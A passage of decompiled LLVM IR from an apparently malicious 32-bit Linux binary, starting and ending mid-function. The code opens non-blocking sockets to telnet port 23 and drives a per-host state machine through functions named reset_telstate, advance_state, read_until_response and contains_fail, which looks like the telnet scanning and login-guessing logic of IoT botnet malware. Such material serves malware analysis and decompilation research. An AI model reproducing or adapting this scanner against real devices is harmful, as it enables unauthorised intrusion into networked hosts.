dec_label_pc_804a5f8:                             ; preds = %dec_label_pc_804a52c
  %v5_804a60e = load i8, i8* %v4_804a542, align 1
  %v6_804a60e = zext i8 %v5_804a60e to i32
  store i32 %v6_804a60e, i32* %eax.global-to-local, align 4
  %v4_804a613 = icmp eq i8 %v5_804a60e, 0
  %v1_804a615 = icmp eq i1 %v4_804a613, false
  br i1 %v1_804a615, label %dec_label_pc_804a6a9, label %dec_label_pc_804a61b

dec_label_pc_804a61b:                             ; preds = %dec_label_pc_804a5f8
  store i32 %v1_804a4a4, i32* %edx.global-to-local, align 4
  store i32 %v2_804a4b2, i32* %eax.global-to-local, align 4
  %v3_804a633 = add i32 %v2_804a633, %v2_804a4b2
  %v4_804a633 = inttoptr i32 %v3_804a633 to i8*
  %v5_804a633 = load i8, i8* %v4_804a633, align 1
  %v2_804a63a = add i8 %v5_804a633, 1
  store i8 %v2_804a63a, i8* %v4_804a633, align 1
  store i32 %v1_804a4a4, i32* %edx.global-to-local, align 4
  store i32 %v2_804a4b2, i32* %eax.global-to-local, align 4
  %v3_804a67a = add i32 %v2_804a67a, %v2_804a4b2
  %v4_804a67a = inttoptr i32 %v3_804a67a to i8*
  %v5_804a67a = load i8, i8* %v4_804a67a, align 2
  %v2_804a681 = add i8 %v5_804a67a, 1
  %v14_804a681 = zext i8 %v2_804a681 to i32
  store i32 %v2_804a4b2, i32* %eax.global-to-local, align 4
  store i32 %v14_804a681, i32* %edx.global-to-local, align 4
  store i8 %v2_804a681, i8* %v4_804a67a, align 2
  br label %dec_label_pc_804a6a9

dec_label_pc_804a6a9:                             ; preds = %dec_label_pc_804a5f8, %dec_label_pc_804a54f, %dec_label_pc_804a61b
  store i32 2, i32* %stack_var_-604, align 4
  %v0_804a6b2 = load i32, i32* @esp, align 4
  %v1_804a6b2 = inttoptr i32 %v0_804a6b2 to i32*
  store i32 23, i32* %v1_804a6b2, align 4
  %v0_804a6b9 = load i32, i32* %stack_var_-604, align 4
  %v1_804a6b9 = trunc i32 %v0_804a6b9 to i16
  %v2_804a6b9 = call i32 @htons(i16 %v1_804a6b9)
  store i32 0, i32* %stack_var_-596, align 4
  store i32 %v1_804a4a4, i32* %edx.global-to-local, align 4
  %v1_804a6f6 = add i32 %v2_804a4b4, 4
  store i32 %v1_804a6f6, i32* %eax.global-to-local, align 4
  %v1_804a6f9 = inttoptr i32 %v1_804a6f6 to i32*
  %v2_804a6f9 = load i32, i32* %v1_804a6f9, align 4
  store i32 %v2_804a6f9, i32* %eax.global-to-local, align 4
  store i32 %storemerge49, i32* @ebx, align 4
  %v0_804a704 = load i32, i32* @esp, align 4
  %v1_804a704 = add i32 %v0_804a704, 8
  %v2_804a704 = inttoptr i32 %v1_804a704 to i32*
  store i32 0, i32* %v2_804a704, align 4
  %v0_804a70c = load i32, i32* @esp, align 4
  %v1_804a70c = add i32 %v0_804a70c, 4
  %v2_804a70c = inttoptr i32 %v1_804a70c to i32*
  store i32 1, i32* %v2_804a70c, align 4
  %v0_804a714 = load i32, i32* @esp, align 4
  %v1_804a714 = inttoptr i32 %v0_804a714 to i32*
  store i32 2, i32* %v1_804a714, align 4
  %v2_804a71b = load i32, i32* %stack_var_-596, align 4
  %sext = mul i32 %v2_804a6b9, 65536
  %v3_804a71b = sdiv i32 %sext, 65536
  %v4_804a71b = call i32 @socket(i32 %v3_804a71b, i32 %v2_804a6f9, i32 %v2_804a71b)
  store i32 %v4_804a71b, i32* @esi, align 4
  %v0_804a725 = load i32, i32* @ebx, align 4
  %v2_804a735 = mul i32 %v0_804a725, 28
  %v3_804a737 = add i32 %v2_804a735, %v2_804a3bd
  %v4_804a737 = inttoptr i32 %v3_804a737 to i32*
  store i32 %v4_804a71b, i32* %v4_804a737, align 4
  store i32 %v1_804a4a4, i32* %edx.global-to-local, align 4
  store i32 %v2_804a4b2, i32* %eax.global-to-local, align 4
  %v3_804a750 = inttoptr i32 %v2_804a4b4 to i32*
  %v4_804a750 = load i32, i32* %v3_804a750, align 4
  store i32 %v4_804a750, i32* %eax.global-to-local, align 4
  %v10_804a753 = icmp eq i32 %v4_804a750, -1
  br i1 %v10_804a753, label %dec_label_pc_804b3f0, label %dec_label_pc_804a75c

dec_label_pc_804a75c:                             ; preds = %dec_label_pc_804a6a9
  store i32 %v1_804a4a4, i32* %edx.global-to-local, align 4
  store i32 %v2_804a4b2, i32* %eax.global-to-local, align 4
  %v4_804a772 = load i32, i32* %v3_804a750, align 4
  store i32 %v4_804a772, i32* %eax.global-to-local, align 4
  %v0_804a775 = load i32, i32* @esp, align 4
  %v1_804a775 = add i32 %v0_804a775, 8
  %v2_804a775 = inttoptr i32 %v1_804a775 to i32*
  store i32 0, i32* %v2_804a775, align 4
  %v0_804a77d = load i32, i32* @esp, align 4
  %v1_804a77d = add i32 %v0_804a77d, 4
  %v2_804a77d = inttoptr i32 %v1_804a77d to i32*
  store i32 3, i32* %v2_804a77d, align 4
  %v0_804a785 = load i32, i32* %eax.global-to-local, align 4
  %v1_804a785 = load i32, i32* @esp, align 4
  %v2_804a785 = inttoptr i32 %v1_804a785 to i32*
  store i32 %v0_804a785, i32* %v2_804a785, align 4
  %v1_804a788 = load i32, i32* %stack_var_-596, align 4
  %v3_804a788 = call i32 @__libc_fcntl(i32 %v2_804a6f9, i32 %v1_804a788, i32 0)
  %v1_804a78f = or i32 %v3_804a788, 2048
  store i32 %v1_804a78f, i32* @ebx, align 4
  store i32 %v1_804a4a4, i32* %edx.global-to-local, align 4
  store i32 %v2_804a4b2, i32* %eax.global-to-local, align 4
  %v4_804a7ab = load i32, i32* %v3_804a750, align 4
  store i32 %v4_804a7ab, i32* %eax.global-to-local, align 4
  %v1_804a7ae = load i32, i32* @esp, align 4
  %v2_804a7ae = add i32 %v1_804a7ae, 8
  %v3_804a7ae = inttoptr i32 %v2_804a7ae to i32*
  store i32 %v1_804a78f, i32* %v3_804a7ae, align 4
  %v0_804a7b2 = load i32, i32* @esp, align 4
  %v1_804a7b2 = add i32 %v0_804a7b2, 4
  %v2_804a7b2 = inttoptr i32 %v1_804a7b2 to i32*
  store i32 4, i32* %v2_804a7b2, align 4
  %v0_804a7ba = load i32, i32* %eax.global-to-local, align 4
  %v1_804a7ba = load i32, i32* @esp, align 4
  %v2_804a7ba = inttoptr i32 %v1_804a7ba to i32*
  store i32 %v0_804a7ba, i32* %v2_804a7ba, align 4
  %v1_804a7bd = load i32, i32* %stack_var_-596, align 4
  %v3_804a7bd = call i32 @__libc_fcntl(i32 %v2_804a6f9, i32 %v1_804a7bd, i32 0)
  store i32 %v2_804a346, i32* @ebx, align 4
  store i32 %v1_804a4a4, i32* %edx.global-to-local, align 4
  store i32 %v2_804a4b2, i32* %eax.global-to-local, align 4
  %v4_804a7de = load i32, i32* %v3_804a750, align 4
  store i32 %v4_804a7de, i32* %eax.global-to-local, align 4
  %v0_804a7e1 = load i32, i32* @esp, align 4
  %v1_804a7e1 = add i32 %v0_804a7e1, 8
  %v2_804a7e1 = inttoptr i32 %v1_804a7e1 to i32*
  store i32 16, i32* %v2_804a7e1, align 4
  %v1_804a7e9 = load i32, i32* @esp, align 4
  %v2_804a7e9 = add i32 %v1_804a7e9, 4
  %v3_804a7e9 = inttoptr i32 %v2_804a7e9 to i32*
  store i32 %v2_804a346, i32* %v3_804a7e9, align 4
  %v0_804a7ed = load i32, i32* %eax.global-to-local, align 4
  %v1_804a7ed = load i32, i32* @esp, align 4
  %v2_804a7ed = inttoptr i32 %v1_804a7ed to i32*
  store i32 %v0_804a7ed, i32* %v2_804a7ed, align 4
  %v1_804a7f0 = load i32, i32* %stack_var_-596, align 4
  %v3_804a7f0 = call i32 @__libc_connect(i32 %v2_804a6f9, i32 %v1_804a7f0, i32 0)
  store i32 %v3_804a7f0, i32* %eax.global-to-local, align 4
  %v10_804a7f5 = icmp eq i32 %v3_804a7f0, -1
  %v1_804a7f8 = icmp eq i1 %v10_804a7f5, false
  br i1 %v1_804a7f8, label %dec_label_pc_804a82c, label %dec_label_pc_804a7fa

dec_label_pc_804a7fa:                             ; preds = %dec_label_pc_804a75c
  %v1_804a7fa = call i32 @__errno_location(i32 %v2_804a6f9)
  store i32 %v1_804a7fa, i32* %eax.global-to-local, align 4
  %v1_804a7ff = inttoptr i32 %v1_804a7fa to i32*
  %v2_804a7ff = load i32, i32* %v1_804a7ff, align 4
  store i32 %v2_804a7ff, i32* %eax.global-to-local, align 4
  %v9_804a801 = icmp eq i32 %v2_804a7ff, 115
  br i1 %v9_804a801, label %dec_label_pc_804a82c, label %dec_label_pc_804a806

dec_label_pc_804a806:                             ; preds = %dec_label_pc_804a7fa
  store i32 %v1_804a4a4, i32* @edx, align 4
  store i32 %v2_804a4b4, i32* %eax.global-to-local, align 4
  %v1_804a81f = load i32, i32* @esp, align 4
  %v2_804a81f = inttoptr i32 %v1_804a81f to i32*
  store i32 %v2_804a4b4, i32* %v2_804a81f, align 4
  %v1_804a822 = call i32 @reset_telstate(i32 %v2_804a6f9)
  store i32 %v1_804a822, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804b3f0

dec_label_pc_804a82c:                             ; preds = %dec_label_pc_804a7fa, %dec_label_pc_804a75c
  store i32 %v1_804a4a4, i32* @edx, align 4
  store i32 %v2_804a4b4, i32* %eax.global-to-local, align 4
  %v0_804a845 = load i32, i32* @esp, align 4
  %v1_804a845 = add i32 %v0_804a845, 4
  %v2_804a845 = inttoptr i32 %v1_804a845 to i32*
  store i32 1, i32* %v2_804a845, align 4
  %v0_804a84d = load i32, i32* %eax.global-to-local, align 4
  %v1_804a84d = load i32, i32* @esp, align 4
  %v2_804a84d = inttoptr i32 %v1_804a84d to i32*
  store i32 %v0_804a84d, i32* %v2_804a84d, align 4
  %v1_804a850 = load i32, i32* %stack_var_-596, align 4
  %v2_804a850 = inttoptr i32 %v2_804a6f9 to i32*
  %v3_804a850 = call i32 @advance_state(i32* %v2_804a850, i32 %v1_804a850)
  store i32 %v3_804a850, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804b3f0

dec_label_pc_804a85a:                             ; preds = %dec_label_pc_804a4ec
  store i32 0, i32* %eax.global-to-local, align 4
  store i32 %v2_804a864, i32* @edi, align 4
  %v5_804a86b = call i8* @_memset(i8* %tmp37, i32 0, i32 32)
  store i32 %v1_804a4a4, i32* %edx.global-to-local, align 4
  store i32 %v2_804a4b2, i32* %eax.global-to-local, align 4
  %v3_804a889 = inttoptr i32 %v2_804a4b4 to i32*
  %v4_804a889 = load i32, i32* %v3_804a889, align 4
  %v2_804a88e = udiv i32 %v4_804a889, 32
  store i32 %v2_804a88e, i32* @ebx, align 4
  store i32 %v1_804a4a4, i32* %edx.global-to-local, align 4
  store i32 %v2_804a4b2, i32* %eax.global-to-local, align 4
  %v4_804a8a7 = load i32, i32* %v3_804a889, align 4
  %v1_804a8aa = urem i32 %v4_804a8a7, 32
  store i32 %v1_804a8aa, i32* %eax.global-to-local, align 4
  %v0_804a8ad = load i32, i32* @ebp, align 4
  %v2_804a8ad = mul nuw nsw i32 %v2_804a88e, 4
  %v3_804a8ad = add nsw i32 %v2_804a8ad, -312
  %v4_804a8ad = add i32 %v3_804a8ad, %v0_804a8ad
  %v5_804a8ad = inttoptr i32 %v4_804a8ad to i32*
  %v6_804a8ad = load i32, i32* %v5_804a8ad, align 4
  %v9_804a8ad = shl i32 1, %v1_804a8aa
  %v12_804a8ad = or i32 %v6_804a8ad, %v9_804a8ad
  store i32 %v12_804a8ad, i32* %v5_804a8ad, align 4
  store i32 0, i32* %stack_var_-324, align 4
  store i32 %v1_804a4a4, i32* %edx.global-to-local, align 4
  store i32 %v2_804a4b2, i32* %eax.global-to-local, align 4
  %v4_804a8de = load i32, i32* %v3_804a889, align 4
  %v1_804a8e1 = add i32 %v4_804a8de, 1
  store i32 %v1_804a8e1, i32* %edx.global-to-local, align 4
  %v1_804a8ea = load i32, i32* @esp, align 4
  %v2_804a8ea = add i32 %v1_804a8ea, 16
  %v3_804a8ea = inttoptr i32 %v2_804a8ea to i32*
  store i32 %v2_804a8e4, i32* %v3_804a8ea, align 4
  %v0_804a8ee = load i32, i32* @esp, align 4
  %v1_804a8ee = add i32 %v0_804a8ee, 12
  %v2_804a8ee = inttoptr i32 %v1_804a8ee to i32*
  store i32 0, i32* %v2_804a8ee, align 4
  store i32 %v2_804a864, i32* %eax.global-to-local, align 4
  %v1_804a8fc = load i32, i32* @esp, align 4
  %v2_804a8fc = add i32 %v1_804a8fc, 8
  %v3_804a8fc = inttoptr i32 %v2_804a8fc to i32*
  store i32 %v2_804a864, i32* %v3_804a8fc, align 4
  %v0_804a900 = load i32, i32* @esp, align 4
  %v1_804a900 = add i32 %v0_804a900, 4
  %v2_804a900 = inttoptr i32 %v1_804a900 to i32*
  store i32 0, i32* %v2_804a900, align 4
  %v0_804a908 = load i32, i32* %edx.global-to-local, align 4
  %v1_804a908 = load i32, i32* @esp, align 4
  %v2_804a908 = inttoptr i32 %v1_804a908 to i32*
  store i32 %v0_804a908, i32* %v2_804a908, align 4
  %v0_804a90b = load i32, i32* %stack_var_-324, align 4
  %v2_804a90b = load i32, i32* %stack_var_-316, align 4
  %v5_804a90b = call i32 @__libc_select(i32 %v0_804a90b, i32 %arg1, i32 %v2_804a90b, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v5_804a90b, i32* %eax.global-to-local, align 4
  %v12_804a913 = icmp eq i32 %v5_804a90b, 1
  %v1_804a917 = icmp eq i1 %v12_804a913, false
  br i1 %v1_804a917, label %dec_label_pc_804aa3a, label %dec_label_pc_804a91d

dec_label_pc_804a91d:                             ; preds = %dec_label_pc_804a85a
  store i32 4, i32* %stack_var_-328, align 4
  store i32 0, i32* %stack_var_-332, align 4
  store i32 %v1_804a4a4, i32* %edx.global-to-local, align 4
  store i32 %v2_804a4b2, i32* %eax.global-to-local, align 4
  %v4_804a947 = load i32, i32* %v3_804a889, align 4
  store i32 %v4_804a947, i32* %edx.global-to-local, align 4
  %v1_804a950 = load i32, i32* @esp, align 4
  %v2_804a950 = add i32 %v1_804a950, 16
  %v3_804a950 = inttoptr i32 %v2_804a950 to i32*
  store i32 %v2_804a94a, i32* %v3_804a950, align 4
  store i32 %v2_804a954, i32* %eax.global-to-local, align 4
  %v1_804a95a = load i32, i32* @esp, align 4
  %v2_804a95a = add i32 %v1_804a95a, 12
  %v3_804a95a = inttoptr i32 %v2_804a95a to i32*
  store i32 %v2_804a954, i32* %v3_804a95a, align 4
  %v0_804a95e = load i32, i32* @esp, align 4
  %v1_804a95e = add i32 %v0_804a95e, 8
  %v2_804a95e = inttoptr i32 %v1_804a95e to i32*
  store i32 4, i32* %v2_804a95e, align 4
  %v0_804a966 = load i32, i32* @esp, align 4
  %v1_804a966 = add i32 %v0_804a966, 4
  %v2_804a966 = inttoptr i32 %v1_804a966 to i32*
  store i32 1, i32* %v2_804a966, align 4
  %v0_804a96e = load i32, i32* %edx.global-to-local, align 4
  %v1_804a96e = load i32, i32* @esp, align 4
  %v2_804a96e = inttoptr i32 %v1_804a96e to i32*
  store i32 %v0_804a96e, i32* %v2_804a96e, align 4
  %v0_804a971 = load i32, i32* %stack_var_-332, align 4
  %v1_804a971 = load i32, i32* %stack_var_-328, align 4
  %v2_804a971 = load i32, i32* %stack_var_-324, align 4
  %v4_804a971 = load i32, i32* %stack_var_-316, align 4
  %v5_804a971 = call i32 @getsockopt(i32 %v0_804a971, i32 %v1_804a971, i32 %v2_804a971, i32 %arg1, i32 %v4_804a971)
  %v3_804a976 = load i32, i32* %stack_var_-332, align 4
  store i32 %v3_804a976, i32* %eax.global-to-local, align 4
  %v1_804a97c = icmp eq i32 %v3_804a976, 0
  store i32 %v1_804a4a4, i32* @edx, align 4
  br i1 %v1_804a97c, label %dec_label_pc_804a9a6, label %dec_label_pc_804a980

dec_label_pc_804a980:                             ; preds = %dec_label_pc_804a91d
  store i32 %v2_804a4b4, i32* %eax.global-to-local, align 4
  %v1_804a999 = load i32, i32* @esp, align 4
  %v2_804a999 = inttoptr i32 %v1_804a999 to i32*
  store i32 %v2_804a4b4, i32* %v2_804a999, align 4
  %v0_804a99c = load i32, i32* %stack_var_-332, align 4
  %v1_804a99c = call i32 @reset_telstate(i32 %v0_804a99c)
  store i32 %v1_804a99c, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804b3f0

dec_label_pc_804a9a6:                             ; preds = %dec_label_pc_804a91d
  store i32 %v2_804a4b2, i32* %eax.global-to-local, align 4
  %v4_804a9bc = load i32, i32* %v3_804a889, align 4
  store i32 %v4_804a9bc, i32* %eax.global-to-local, align 4
  %v0_804a9bf = load i32, i32* @esp, align 4
  %v1_804a9bf = add i32 %v0_804a9bf, 8
  %v2_804a9bf = inttoptr i32 %v1_804a9bf to i32*
  store i32 0, i32* %v2_804a9bf, align 4
  %v0_804a9c7 = load i32, i32* @esp, align 4
  %v1_804a9c7 = add i32 %v0_804a9c7, 4
  %v2_804a9c7 = inttoptr i32 %v1_804a9c7 to i32*
  store i32 3, i32* %v2_804a9c7, align 4
  %v0_804a9cf = load i32, i32* %eax.global-to-local, align 4
  %v1_804a9cf = load i32, i32* @esp, align 4
  %v2_804a9cf = inttoptr i32 %v1_804a9cf to i32*
  store i32 %v0_804a9cf, i32* %v2_804a9cf, align 4
  %v0_804a9d2 = load i32, i32* %stack_var_-332, align 4
  %v1_804a9d2 = load i32, i32* %stack_var_-328, align 4
  %v2_804a9d2 = load i32, i32* %stack_var_-324, align 4
  %v3_804a9d2 = call i32 @__libc_fcntl(i32 %v0_804a9d2, i32 %v1_804a9d2, i32 %v2_804a9d2)
  %v1_804a9d9 = and i32 %v3_804a9d2, -2049
  store i32 %v1_804a9d9, i32* @ebx, align 4
  store i32 %v1_804a4a4, i32* %edx.global-to-local, align 4
  store i32 %v2_804a4b2, i32* %eax.global-to-local, align 4
  %v4_804a9f5 = load i32, i32* %v3_804a889, align 4
  store i32 %v4_804a9f5, i32* %eax.global-to-local, align 4
  %v1_804a9f8 = load i32, i32* @esp, align 4
  %v2_804a9f8 = add i32 %v1_804a9f8, 8
  %v3_804a9f8 = inttoptr i32 %v2_804a9f8 to i32*
  store i32 %v1_804a9d9, i32* %v3_804a9f8, align 4
  %v0_804a9fc = load i32, i32* @esp, align 4
  %v1_804a9fc = add i32 %v0_804a9fc, 4
  %v2_804a9fc = inttoptr i32 %v1_804a9fc to i32*
  store i32 4, i32* %v2_804a9fc, align 4
  %v0_804aa04 = load i32, i32* %eax.global-to-local, align 4
  %v1_804aa04 = load i32, i32* @esp, align 4
  %v2_804aa04 = inttoptr i32 %v1_804aa04 to i32*
  store i32 %v0_804aa04, i32* %v2_804aa04, align 4
  %v0_804aa07 = load i32, i32* %stack_var_-332, align 4
  %v1_804aa07 = load i32, i32* %stack_var_-328, align 4
  %v2_804aa07 = load i32, i32* %stack_var_-324, align 4
  %v3_804aa07 = call i32 @__libc_fcntl(i32 %v0_804aa07, i32 %v1_804aa07, i32 %v2_804aa07)
  store i32 %v1_804a4a4, i32* @edx, align 4
  store i32 %v2_804a4b4, i32* %eax.global-to-local, align 4
  %v0_804aa25 = load i32, i32* @esp, align 4
  %v1_804aa25 = add i32 %v0_804aa25, 4
  %v2_804aa25 = inttoptr i32 %v1_804aa25 to i32*
  store i32 2, i32* %v2_804aa25, align 4
  %v0_804aa2d = load i32, i32* %eax.global-to-local, align 4
  %v1_804aa2d = load i32, i32* @esp, align 4
  %v2_804aa2d = inttoptr i32 %v1_804aa2d to i32*
  store i32 %v0_804aa2d, i32* %v2_804aa2d, align 4
  %v0_804aa30 = load i32, i32* %stack_var_-332, align 4
  %v1_804aa30 = load i32, i32* %stack_var_-328, align 4
  %v2_804aa30 = inttoptr i32 %v0_804aa30 to i32*
  %v3_804aa30 = call i32 @advance_state(i32* %v2_804aa30, i32 %v1_804aa30)
  store i32 %v3_804aa30, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804b3f0

dec_label_pc_804aa3a:                             ; preds = %dec_label_pc_804a85a
  %v13_804aa3a = icmp eq i32 %v5_804a90b, -1
  %v1_804aa3e = icmp eq i1 %v13_804aa3a, false
  store i32 %v1_804a4a4, i32* @edx, align 4
  br i1 %v1_804aa3e, label %dec_label_pc_804aa66, label %dec_label_pc_804aa40

dec_label_pc_804aa40:                             ; preds = %dec_label_pc_804aa3a
  store i32 %v2_804a4b4, i32* %eax.global-to-local, align 4
  %v1_804aa59 = load i32, i32* @esp, align 4
  %v2_804aa59 = inttoptr i32 %v1_804aa59 to i32*
  store i32 %v2_804a4b4, i32* %v2_804aa59, align 4
  %v1_804aa5c = call i32 @reset_telstate(i32 %v5_804a90b)
  store i32 %v1_804aa5c, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804b3f0

dec_label_pc_804aa66:                             ; preds = %dec_label_pc_804aa3a
  store i32 %v1_804a4b6, i32* %eax.global-to-local, align 4
  %v2_804aa81 = load i32, i32* %v1_804a4b9, align 4
  store i32 %v2_804aa81, i32* %eax.global-to-local, align 4
  %v1_804aa83 = add i32 %v2_804aa81, 5
  store i32 %v1_804aa83, i32* @ebx, align 4
  %v0_804aa86 = load i32, i32* @esp, align 4
  %v1_804aa86 = inttoptr i32 %v0_804aa86 to i32*
  store i32 0, i32* %v1_804aa86, align 4
  %v1_804aa8d = inttoptr i32 %v5_804a90b to i32*
  %v2_804aa8d = call i32 @__GI_time(i32* %v1_804aa8d)
  store i32 %v2_804aa8d, i32* %eax.global-to-local, align 4
  %v0_804aa92 = load i32, i32* @ebx, align 4
  %v7_804aa92 = icmp ult i32 %v0_804aa92, %v2_804aa8d
  %v1_804aa94 = icmp eq i1 %v7_804aa92, false
  br i1 %v1_804aa94, label %dec_label_pc_804b3f0, label %dec_label_pc_804aa9a

dec_label_pc_804aa9a:                             ; preds = %dec_label_pc_804aa66
  store i32 %v1_804a4a4, i32* @edx, align 4
  store i32 %v2_804a4b4, i32* %eax.global-to-local, align 4
  %v1_804aab3 = load i32, i32* @esp, align 4
  %v2_804aab3 = inttoptr i32 %v1_804aab3 to i32*
  store i32 %v2_804a4b4, i32* %v2_804aab3, align 4
  %v0_804aab6 = load i32, i32* %stack_var_-332, align 4
  %v1_804aab6 = call i32 @reset_telstate(i32 %v0_804aab6)
  store i32 %v1_804aab6, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804b3f0

dec_label_pc_804aac0:                             ; preds = %dec_label_pc_804a4ec
  store i32 %v1_804a4a4, i32* %edx.global-to-local, align 4
  %v1_804aad8 = add i32 %v2_804a4b4, 24
  store i32 %v1_804aad8, i32* %eax.global-to-local, align 4
  %v1_804aadb = inttoptr i32 %v1_804aad8 to i32*
  %v2_804aadb = load i32, i32* %v1_804aadb, align 4
  store i32 %v2_804aadb, i32* @ebx, align 4
  store i32 %v1_804a4a4, i32* %edx.global-to-local, align 4
  store i32 %v2_804a4b2, i32* %eax.global-to-local, align 4
  %v3_804aaf3 = inttoptr i32 %v2_804a4b4 to i32*
  %v4_804aaf3 = load i32, i32* %v3_804aaf3, align 4
  store i32 %v4_804aaf3, i32* %edx.global-to-local, align 4
  %v0_804aaf6 = load i32, i32* @esp, align 4
  %v1_804aaf6 = add i32 %v0_804aaf6, 16
  %v2_804aaf6 = inttoptr i32 %v1_804aaf6 to i32*
  store i32 134587308, i32* %v2_804aaf6, align 4
  %v0_804aafe = load i32, i32* @esp, align 4
  %v1_804aafe = add i32 %v0_804aafe, 12
  %v2_804aafe = inttoptr i32 %v1_804aafe to i32*
  store i32 1024, i32* %v2_804aafe, align 4
  %v0_804ab06 = load i32, i32* @ebx, align 4
  %v1_804ab06 = load i32, i32* @esp, align 4
  %v2_804ab06 = add i32 %v1_804ab06, 8
  %v3_804ab06 = inttoptr i32 %v2_804ab06 to i32*
  store i32 %v0_804ab06, i32* %v3_804ab06, align 4
  store i32 %arg1, i32* %eax.global-to-local, align 4
  %v1_804ab0d = load i32, i32* @esp, align 4
  %v2_804ab0d = add i32 %v1_804ab0d, 4
  %v3_804ab0d = inttoptr i32 %v2_804ab0d to i32*
  store i32 %arg1, i32* %v3_804ab0d, align 4
  %v0_804ab11 = load i32, i32* %edx.global-to-local, align 4
  %v1_804ab11 = load i32, i32* @esp, align 4
  %v2_804ab11 = inttoptr i32 %v1_804ab11 to i32*
  store i32 %v0_804ab11, i32* %v2_804ab11, align 4
  %v1_804ab14 = call i32 @read_until_response(i32 %v6_804a502)
  %v1_804ab19 = icmp eq i32 %v1_804ab14, 0
  store i32 %v1_804a4a4, i32* @edx, align 4
  store i32 %v2_804a4b4, i32* %eax.global-to-local, align 4
  br i1 %v1_804ab19, label %dec_label_pc_804aba6, label %dec_label_pc_804ab21

dec_label_pc_804ab21:                             ; preds = %dec_label_pc_804aac0
  store i32 %v1_804aad8, i32* %eax.global-to-local, align 4
  %v2_804ab3c = load i32, i32* %v1_804aadb, align 4
  store i32 %v2_804ab3c, i32* %eax.global-to-local, align 4
  %v1_804ab3e = load i32, i32* @esp, align 4
  %v2_804ab3e = inttoptr i32 %v1_804ab3e to i32*
  store i32 %v2_804ab3c, i32* %v2_804ab3e, align 4
  %v0_804ab41 = load i32, i32* %stack_var_-332, align 4
  %v1_804ab41 = call i32 @contains_fail(i32 %v0_804ab41)
  %v1_804ab46 = icmp eq i32 %v1_804ab41, 0
  store i32 %v1_804a4a4, i32* @edx, align 4
  store i32 %v2_804a4b4, i32* %eax.global-to-local, align 4
  %v0_804ab91 = load i32, i32* @esp, align 4
  %v1_804ab91 = add i32 %v0_804ab91, 4
  %v2_804ab91 = inttoptr i32 %v1_804ab91 to i32*
  br i1 %v1_804ab46, label %dec_label_pc_804ab78, label %dec_label_pc_804ab4a

dec_label_pc_804ab4a:                             ; preds = %dec_label_pc_804ab21
  store i32 0, i32* %v2_804ab91, align 4
  %v0_804ab6b = load i32, i32* %eax.global-to-local, align 4
  %v1_804ab6b = load i32, i32* @esp, align 4
  %v2_804ab6b = inttoptr i32 %v1_804ab6b to i32*
  store i32 %v0_804ab6b, i32* %v2_804ab6b, align 4
  %v0_804ab6e = load i32, i32* %stack_var_-332, align 4
  %v1_804ab6e = load i32, i32* %stack_var_-328, align 4
  %v2_804ab6e = inttoptr i32 %v0_804ab6e to i32*
  %v3_804ab6e = call i32 @advance_state(i32* %v2_804ab6e, i32 %v1_804ab6e)
  store i32 %v3_804ab6e, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804b3f0

dec_label_pc_804ab78:                             ; preds = %dec_label_pc_804ab21
  store i32 3, i32* %v2_804ab91, align 4
  %v0_804ab99 = load i32, i32* %eax.global-to-local, align 4
  %v1_804ab99 = load i32, i32* @esp, align 4
  %v2_804ab99 = inttoptr i32 %v1_804ab99 to i32*
  store i32 %v0_804ab99, i32* %v2_804ab99, align 4
  %v0_804ab9c = load i32, i32* %stack_var_-332, align 4
  %v1_804ab9c = load i32, i32* %stack_var_-328, align 4
  %v2_804ab9c = inttoptr i32 %v0_804ab9c to i32*
  %v3_804ab9c = call i32 @advance_state(i32* %v2_804ab9c, i32 %v1_804ab9c)
  store i32 %v3_804ab9c, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804b3f0

dec_label_pc_804aba6:                             ; preds = %dec_label_pc_804aac0
  store i32 %v1_804a4b6, i32* %eax.global-to-local, align 4
  %v2_804abc1 = load i32, i32* %v1_804a4b9, align 4
  store i32 %v2_804abc1, i32* %eax.global-to-local, align 4
  %v1_804abc3 = add i32 %v2_804abc1, 7
  store i32 %v1_804abc3, i32* @ebx, align 4
  %v0_804abc6 = load i32, i32* @esp, align 4
  %v1_804abc6 = inttoptr i32 %v0_804abc6 to i32*
  store i32 0, i32* %v1_804abc6, align 4
  %v0_804abcd = load i32, i32* %stack_var_-332, align 4
  %v1_804abcd = inttoptr i32 %v0_804abcd to i32*
  %v2_804abcd = call i32 @__GI_time(i32* %v1_804abcd)
  store i32 %v2_804abcd, i32* %eax.global-to-local, align 4
  %v0_804abd2 = load i32, i32* @ebx, align 4
  %v7_804abd2 = icmp ult i32 %v0_804abd2, %v2_804abcd
  %v1_804abd4 = icmp eq i1 %v7_804abd2, false
  br i1 %v1_804abd4, label %dec_label_pc_804b3f0, label %dec_label_pc_804abda

dec_label_pc_804abda:                             ; preds = %dec_label_pc_804aba6
  store i32 %v1_804a4a4, i32* @edx, align 4
  store i32 %v2_804a4b4, i32* %eax.global-to-local, align 4
  %v1_804abf3 = load i32, i32* @esp, align 4
  %v2_804abf3 = inttoptr i32 %v1_804abf3 to i32*
  store i32 %v2_804a4b4, i32* %v2_804abf3, align 4
  %v0_804abf6 = load i32, i32* %stack_var_-332, align 4
  %v1_804abf6 = call i32 @reset_telstate(i32 %v0_804abf6)
  store i32 %v1_804abf6, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804b3f0

dec_label_pc_804ac00:                             ; preds = %dec_label_pc_804a4ec
  store i32 %v1_804a4a4, i32* %edx.global-to-local, align 4
  store i32 %v2_804a4b2, i32* %eax.global-to-local, align 4
  %v3_804ac16 = add i32 %v2_804a67a, %v2_804a4b2
  %v4_804ac16 = inttoptr i32 %v3_804ac16 to i8*
  %v5_804ac16 = load i8, i8* %v4_804ac16, align 2
  %v6_804ac16 = zext i8 %v5_804ac16 to i32
  store i32 %v6_804ac16, i32* %eax.global-to-local, align 4
  %v1_804ac1e = mul nuw nsw i32 %v6_804ac16, 4
  %v2_804ac1e = add nuw nsw i32 %v1_804ac1e, 134584160
  %v3_804ac1e = inttoptr i32 %v2_804ac1e to i32*
  %v4_804ac1e = load i32, i32* %v3_804ac1e, align 4
  %v1_804ac30 = and i32 %v4_804ac1e, -256
  store i32 %v1_804ac30, i32* %eax.global-to-local, align 4
